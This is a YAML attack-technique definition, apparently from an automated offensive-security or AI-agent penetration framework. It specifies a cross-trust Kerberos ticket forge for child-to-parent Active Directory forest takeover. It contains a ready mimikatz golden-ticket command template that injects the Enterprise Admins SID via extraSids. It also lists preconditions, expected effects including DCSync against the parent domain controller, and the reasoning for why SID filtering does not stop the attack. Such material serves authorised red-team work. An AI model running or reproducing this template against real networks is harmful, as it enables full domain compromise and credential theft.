name: trust_ticket_forge
category: ad
description: "Cross-trust TGT forge with extra SIDs (child\u2192parent forest takeover)"
preconditions:
- has_trust_key
- trust_key_extracted
- has_cred
- domain_joined
parameters:
  child_domain: from_engagement.domain
  parent_domain: from_engagement.parent_domain
  child_sid: from_engagement.child_sid
  parent_sid: from_engagement.parent_sid
  trust_key: from_cred.trust_key
command_template: mimikatz "kerberos::golden /user:Administrator /domain:{child_domain} /sid:{child_sid} /sids:{parent_sid}-519
  /rc4:{trust_key} /service:krbtgt /target:{parent_domain} /ticket:trust.kirbi"
parser: generic_parser
expected_effects:
- forest_admin
- trust_ticket_forged
- dcsync_against_parent
falsifier:
  pattern: SID filtering|denied|ERROR|mimikatz|invalid
  timeout: 30
model_tier: sonnet
mechanism: "Forge an inter-realm TGT with EnterpriseAdmins SID injected via extraSids. Parent\nforest accepts because its\
  \ krbtgt isn't checked at this stage and SID filtering is\nOFF by default for in-forest trusts. Pass-the-ticket and DCSync\
  \ against the parent\nDC. This is the canonical child\u2192parent forest takeover.\n"
references:
  ocd_mindmap: "Branch 14: Cross-trust ticket forge (child \u2192 parent forest)"
  hacktricks: windows-hardening/active-directory-methodology/forest-and-domain-trusts.md
